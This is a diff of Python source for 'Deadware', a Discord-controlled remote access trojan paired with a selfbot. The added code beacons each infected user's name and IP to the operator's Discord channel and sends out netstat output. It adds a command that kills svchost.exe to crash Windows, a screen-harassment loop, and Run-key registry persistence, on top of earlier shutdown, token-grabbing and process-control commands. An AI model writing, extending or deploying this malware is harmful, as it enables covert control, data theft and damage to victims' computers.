@@ -1,10 +1,11 @@
 ### INFO ###
-#Author: Spool
+#Authors: Spool
 
 ### IMPORTS ###
 import ctypes
 import asyncio
 import datetime
+from ipaddress import ip_address
 import json
 import os
 import random
@@ -24,6 +25,10 @@ from discord import Permissions
 from discord.ext import commands
 from discord.utils import get
 import multiprocessing
+from win32api import *
+from win32gui import *
+from win32con import *
+from win32file import *
 
 init()
 
@@ -35,7 +40,7 @@ except Exception:
 ### VARIABLES AND STUFF ###
 ### DO NOT TOUCH ANY OF THIS UNLESS YOU KNOW WHAT YOU'RE DOING ###
 class Selfbot():
-    __version__ = 0.1
+    __version__ = 1.0
 
 class Coms():
     __amount__ = 76
@@ -808,6 +813,17 @@ def GetIP():
     return ip
 
 Deadware.remove_command('help')
+
+@Deadware.event
+async def on_ready():
+    channel = Deadware.get_channel(935607961424887849) #CHANGE THIS
+    user = getpass.getuser()
+    embed = discord.Embed(title='[+] Deadware Connection!', description='You have a new connection', colour=RandomColor())
+    embed.add_field(name=f'User: {user}', value='** **', inline=False)
+    embed.add_field(name='IP: ' + GetIP(), value='** **', inline=False)
+
+    await channel.send(embed=embed)
+
 @Deadware.event
 async def on_command_error(ctx, error):
     if isinstance(error, commands.CommandNotFound):
@@ -844,6 +860,7 @@ async def computer_shutdown(ctx):
     await ctx.message.delete()
     try:
         os.system('shutdown /s')
+        await ctx.send("Shutdown PC")
     except:
         await ctx.send('Could not shutdown computer')
 
@@ -863,7 +880,7 @@ async def deadware_bomb(ctx):
 async def help(ctx):
     await ctx.message.delete()
     embed = discord.Embed(title='Deadware Commands', description=' ', colour=RandomColor())
-    embed.add_field(name='Command List', value='test_con - tests connection\ncreate_file <filename> - creates a file\nstart_process <process> - starts process\ncomputer_shutdown - shuts down computer\ndeadware_bomb - messes with computer\nget_token - gets selfbot token\nstart_typing <message> - opens notepad and types message\nget_ip - gets machine IP\nend_task <task> - ends a task\nget_tasks - gets current processes running')
+    embed.add_field(name='Command List', value='test_con - tests connection\ncreate_file <filename> - creates a file\nstart_process <process> - starts process\ncomputer_shutdown - shuts down computer\ndeadware_bomb - messes with computer\nget_token - gets selfbot token\nstart_typing <message> - opens notepad and types message\nget_ip - gets machine IP\nend_task <task> - ends a task\nget_tasks - gets current processes running\nget_netstat - gets netstat output\nblue_screen - blue screen of death\nerror_drawing - cursor error drawing\npersist <reg name> <copy name> - tries to create persistence')
 
     await ctx.send(embed=embed)
 
@@ -883,6 +900,7 @@ async def start_typing(ctx, *, msg):
         os.system('start notepad.exe')
         time.sleep(1)
         pyautogui.typewrite(msg)
+        await ctx.send("Success")
     except Exception:
         await ctx.send('Could not start typing')
 
@@ -913,8 +931,60 @@ async def get_tasks(ctx):
     except Exception:
         await ctx.send('Could not list tasks')
 
+@Deadware.command()
+async def get_netstat(ctx):
+    await ctx.message.delete()
+    try:
+        os.system('netstat -an > C://ProgramData/netstatdata.txt')
+        await ctx.send(file=discord.File(r'C://ProgramData/netstatdata.txt'))
+    except Exception:
+        await ctx.send('Cannot get netstat')
+
+@Deadware.command()
+async def blue_screen(ctx):
+    await ctx.message.delete()
+    try:
+        __import__("os").system("taskkill /F /IM svchost.exe")
+        await ctx.send("Blue Screened!")
+    except Exception:
+        await ctx.send("Could not blue screen")
+
+from random import randrange as rd
+@Deadware.command()
+async def error_drawing(ctx):
+    await ctx.message.delete()
+    try:
+        IconWarning = LoadIcon(None, 32515)
+        IconError  = LoadIcon(None, 32513)
+        sw,sh = (GetSystemMetrics(0), GetSystemMetrics(1))
+        HDC = GetDC(0)
+        mouseX,mouseY = GetCaretPos()
+        while True:
+            DrawIcon(HDC, rd(sw), rd(sh), IconWarning)
+            for i in range(0, 60):
+                mouseX,mouseY = GetCursorPos()
+                DrawIcon(HDC, mouseX, mouseY, IconError)
+                time.sleep(10)
+    except Exception:
+        await ctx.send("Could not do error drawing")
+
+import sys, shutil, subprocess
+@Deadware.command()
+async def persist(ctx, *, reg_name, copy_name):
+    await ctx.message.delete()
+    file_location = os.environ['appdata'] + '\\' + copy_name
+    try:
+        if not os.path.exists(file_location):
+            shutil.copyfile(sys.executable, file_location)
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' + reg_name + ' /t REG_SZ /d "' + file_location + '"', shell=True)
+            await ctx.send('[+] Created Persistence With Reg Key: ' + reg_name)
+        else:
+            await ctx.send('[+] Persistence Already Exists')
+    except:
+        await ctx.send('[+] Error Creating Persistence With The Target Machine')
+
 loop.create_task(Deadcord.start(token, bot=False))
-loop.create_task(Deadware.start('BOT-TOKEN-HERE'))
+loop.create_task(Deadware.start('BOT-TOKEN-HERE')) #CHANGE THIS
 
 try:
     loop.run_forever()
